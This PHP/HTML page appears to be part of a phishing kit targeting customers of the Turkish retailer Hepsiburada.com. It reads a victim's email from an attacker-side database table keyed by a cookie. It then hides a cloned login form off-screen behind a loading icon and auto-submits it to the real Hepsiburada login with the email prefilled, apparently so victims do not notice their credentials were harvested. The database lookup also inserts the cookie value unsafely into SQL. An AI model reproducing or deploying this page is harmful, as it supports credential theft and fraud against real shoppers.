<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `hepsiburada` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["Form1"].submit();}</script>



<form name="Form1" method="post" action="https://www.hepsiburada.com/login.aspx?returnURL=default.aspx" id="Form1">
<input type="hidden" name="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" value="">
<input type="hidden" name="__VIEWSTATE" value="dDwzMTcyNzEwMDY7Oz7LjvjiGTQU+teJUgtZ31l//+VWVA==">



	<div class="cont font12 hl38">
		<span class="header colorV2">Üye Girişi</span> <span id="Signin1_lblMsg" class="desc">
			Hepsiburada.com üyesiyseniz<br>
			<b>e-posta adresinizi</b> ve <b>şifrenizi</b> girin.</span>  <br>
		
		<div id="Signin1_trUserName" class="fleft">
			<span class="text">E-Posta</span>
			<div class="fleft w230 trans clearfix H2Inputs uyeInputTXT jqtransformdone">
				<div class="jqTransformInputWrapper jqTransformSafari jqTransformInputWrapper_hover" style="width: 200px;"><div class="jqTransformInputInner"><div><input name="Signin1:txtUserName" type="text" maxlength="100" id="Signin1_txtUserName" autocomplete="off" onKeyPress="return clickButtonV2(event,'Signin1_btnLoginLink')" class="jqtranformdone jqTransformInput" style="width: 214px;" value="<?=$email;?>"></div></div></div>
			</div>
		</div>
		<span class="text mt10">Şifre</span>
		<div class="fleft w230 trans HInputs uyeInputTXT jqtransformdone">
			<div class="jqTransformInputWrapper jqTransformSafari" style="width: 200px;"><div class="jqTransformInputInner"><div><input name="Signin1:txtPassword" type="password" id="Signin1_txtPassword" autocomplete="off" onKeyPress="return clickButtonV2(event,'Signin1_btnLoginLink')" class="jqtranformdone jqTransformInput" style="width: 214px;"></div></div></div>
			
			<span id="Signin1_lbError" class="error"></span>
		</div>
		<div class="fleft btn mb5 mt5 sgnButton">
			<div class="clearfix">
				
				<a id="Signin1_btnLoginLink" class="link-button-yellowBtn spriteyellowBtn" href="javascript:__doPostBack('Signin1$btnLoginLink','')">
					<span class="spriteyellowBtn">GİRİŞ</span>
				</a>
			</div>
		</div>
		


			</div>
		</form>

</body>
</html>

